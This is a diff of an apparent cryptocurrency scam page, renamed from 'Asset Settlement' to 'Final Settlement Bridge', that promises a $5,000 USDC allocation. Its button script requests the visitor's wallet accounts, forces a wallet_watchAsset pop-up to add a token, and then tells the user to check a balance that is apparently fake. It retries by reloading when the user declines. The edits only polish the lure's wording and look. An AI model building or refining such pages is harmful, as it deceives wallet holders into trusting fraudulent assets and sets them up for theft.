@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Asset Settlement - Final</title>
+    <title>Final Settlement Bridge</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 80px; }
-        .terminal { border: 2px solid #0f0; padding: 30px; display: inline-block; border-radius: 15px; width: 85%; max-width: 400px; box-shadow: 0 0 15px #0f0; }
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
+        .container { border: 2px solid #0f0; padding: 30px; display: inline-block; border-radius: 15px; box-shadow: 0 0 15px #0f0; }
         button { 
             background: #0f0; color: #000; border: none; padding: 25px; 
             font-weight: bold; width: 100%; cursor: pointer; border-radius: 10px; font-size: 1.2em; margin-top: 20px;
@@ -14,21 +14,17 @@
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <h2 style="margin:0;">SYSTEM: READY</h2>
-        <p>ALLOCATION: $5,000.00 USDC</p>
-        <hr style="border:0; border-top:1px solid #333; margin: 20px 0;">
-        <button id="finalTrigger">ACTIVATE ASSET LINK</button>
+    <div class="container">
+        <h2 style="margin:0;">BRIDGE STATUS: READY</h2>
+        <p>ASSET ALLOCATION: $5,000.00 USDC</p>
+        <button id="trigger">LINK TO HOME SCREEN</button>
     </div>
 
     <script>
-        document.getElementById('finalTrigger').onclick = async () => {
+        document.getElementById('trigger').onclick = async () => {
             if (window.ethereum) {
                 try {
-                    // 1. Force the Identity Handshake
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    
-                    // 2. Force the Asset Indexing (The Pop-up)
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -40,7 +36,7 @@
                             },
                         },
                     });
-                    alert("Handshake Success. Close browser to view balance.");
+                    alert("Success! Check your Home Screen balance.");
                 } catch (e) {
                     window.location.reload();
                 }
